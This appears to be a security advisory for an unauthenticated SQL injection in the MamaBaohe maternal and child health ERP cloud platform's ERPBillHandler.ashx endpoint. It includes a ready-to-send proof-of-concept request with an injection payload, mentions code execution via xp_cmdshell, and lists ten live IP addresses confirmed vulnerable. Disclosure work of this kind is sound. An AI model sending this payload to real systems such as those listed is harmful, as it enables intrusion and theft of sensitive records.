# MamaBaohe ERP Management Cloud Platform SQL Injection

## Overview

| Field | Value |
|-------|-------|
| **Product** | Maternal and Child Health ERP Management Cloud Platform (MamaBaohe / 妈妈宝盒) |
| **Vendor** | Wuhan Jintongfang Technology Co., Ltd. |
| **Version** | 4.0 (build 2025-04-29) and possibly earlier |
| **Vulnerability Type** | SQL Injection |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **CVSS 4.0 Score** | 9.3 (Critical) |
| **Attack Vector** | Network |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Impact** | Data Disclosure, Data Manipulation, Potential RCE |
# MamaBaohe-ERP-SQLi
The `ERPBillHandler.ashx` endpoint in the MamaBaohe ERP Management Cloud Platform contains a SQL injection vulnerability. The `billdate` parameter in `action=search` requests does not properly sanitize user input, allowing unauthenticated remote attackers to execute arbitrary SQL queries.

Successful exploitation leads to:
1. Disclosure of sensitive database information (database names, tables, user credentials)
2. Data modification or deletion
3. Potential remote code execution via `xp_cmdshell` (if enabled)

## Affected Endpoint


## Proof of Concept

### Manual Verification

Send the following HTTP request:


GET /APIHandler/ERPBillHandler.ashx?action=search&billdate='+AND+1=CONVERT(int,+@@VERSION)+AND+'1'='1 HTTP/1.1
Host: [target]
Cookie: ASP.NET_SessionId=[any_value]



<img width="2274" height="1047" alt="image" src="https://github.com/user-attachments/assets/787b8a0e-649e-4164-b069-de092e3b5d98" />



## Affected Systems

The following instances have been confirmed vulnerable during security testing:

| IP Address | Port | Status | Notes |
|------------|------|--------|-------|
| 111.53.134.165 | 443 | ✅ Confirmed | HTTPS |
| 8.140.59.188 | 8081 | ✅ Confirmed | HTTP |
| 47.115.8.206 | 8081 | ✅ Confirmed | HTTP |
| 116.62.53.127 | 8081 | ✅ Confirmed | HTTP |
| 8.134.75.148 | 8081 | ✅ Confirmed | HTTP |
| 119.23.54.168 | 8081 | ✅ Confirmed | HTTP |
| 8.148.11.171 | 8081 | ✅ Confirmed | HTTP |
| 8.141.97.172 | 8081 | ✅ Confirmed | HTTP |
| 1.116.190.46 | 8081 | ✅ Confirmed | HTTP |
| 47.98.216.7 | 8081 | ✅ Confirmed | HTTP |

> **Note:** These IP addresses are provided for reference purposes only. Do not test without proper authorization. Unauthorized access is illegal.


